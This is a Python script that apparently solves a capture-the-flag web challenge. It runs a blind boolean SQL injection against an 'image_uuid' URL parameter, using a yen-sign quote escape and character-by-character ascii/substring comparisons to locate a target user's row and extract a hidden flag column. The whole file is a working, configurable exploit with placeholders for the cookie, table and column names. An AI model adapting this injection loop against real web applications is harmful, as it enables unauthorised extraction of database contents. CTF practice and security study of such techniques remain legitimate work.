import requests
import time

'''
The vulnerable url does not allow to insert quotes for making queries containing, for example, SELECT flag FROM users WHERE username='Erma'.
Thus, a different approach is needed: the following code finds the row index of the table where the attacked username is. This allows to then
to spot the flag accessing it by row index.
'''

# Configuration
url = "https://web6.chall.necst.it/myphotos"
session_cookie= "<cookie>" # to modify: insert your own cookie
table_name_where_flag_is = "tokyostreets.himitsu" # to modify: insert your own
column_name_where_flag_is = "kokki" # to modify: insert your own
username_column_name = "yuzamei" # to modify: insert your own
attacked_username = "Erma" # to modify: insert your own

def flag_spoofer():
    session = requests.Session()
    file = open('flag.txt', 'w')
    
    not_found=True
    row=0

    print("Searching the row...")
    while not_found:
        
        char_index = 1
        while char_index <= len(attacked_username):
            
            query = f"¥\' or ascii(substring((SELECT " + username_column_name + " FROM " + table_name_where_flag_is+" LIMIT 1 OFFSET " + str(row) + "), " + str(char_index) + ", 1)) = " + str(ord(attacked_username[char_index-1])) + " LIMIT 1;--%20"

            success = False
            while not success:
                try:
                    request = session.get(url, params={'image_uuid': query}, cookies={'session': session_cookie})
                    success = True
                except requests.exceptions.ConnectionError:
                    print("Connection error, let's try again after 5 seconds")
                    time.sleep(5)

            if(len(request.history)==0): # when the table's row contains a username whose current character is equal to the current character of attacked_username
                if char_index == len(attacked_username):
                    not_found=False
                char_index=char_index + 1
                continue
            elif(len(request.history)>0): 
                row = row + 1
                char_index = 0
                break
            else:
                print("Error raised")

    print("row is: "+ str(row))

    file.write("**** FLAG ****\n")
    for char_index in range(1,40):  # for each character of the flag

            for n in range(48,123): # to spot for numbers + letters

                query = f"¥\' or ascii(substring( (SELECT " + column_name_where_flag_is +" FROM " + table_name_where_flag_is + " WHERE "+username_column_name+" = ( SELECT "+username_column_name+" FROM "+ table_name_where_flag_is +" LIMIT 1 OFFSET " + str(row) + ") ), " + str(char_index) + ", 1)) = " + str(n) + " LIMIT 1;--%20"

                success = False
                while not success:
                    try:
                        request = session.get(url, params={'image_uuid': query}, cookies={'session': session_cookie})
                        success = True
                    except requests.exceptions.ConnectionError:
                        print("Connection error, let's try again after 5 seconds")
                        time.sleep(5)

                if(len(request.history)==0):   
                    file.write(chr(n)) # to convert in ascii
                    print("converted :"+ chr(n)+" ascii num:"+str(n))
                    break
                elif(len(request.history)>0):
                    continue
                else:
                    print("Error raised")

    file.write("\n")

    print("Finished!")
    file.close()

flag_spoofer()